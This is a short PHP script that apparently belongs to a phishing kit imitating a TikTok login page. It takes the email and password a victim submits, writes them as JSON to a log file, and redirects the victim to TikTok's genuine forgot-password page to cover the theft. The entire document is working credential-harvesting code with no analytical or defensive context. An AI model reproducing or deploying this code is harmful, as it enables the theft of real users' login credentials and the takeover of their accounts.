<?php

header('Location: https://www.tiktok.com/login/email/forget-password');
$data = array('site' => 'Tiktok',
  'user' => $_POST['email'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>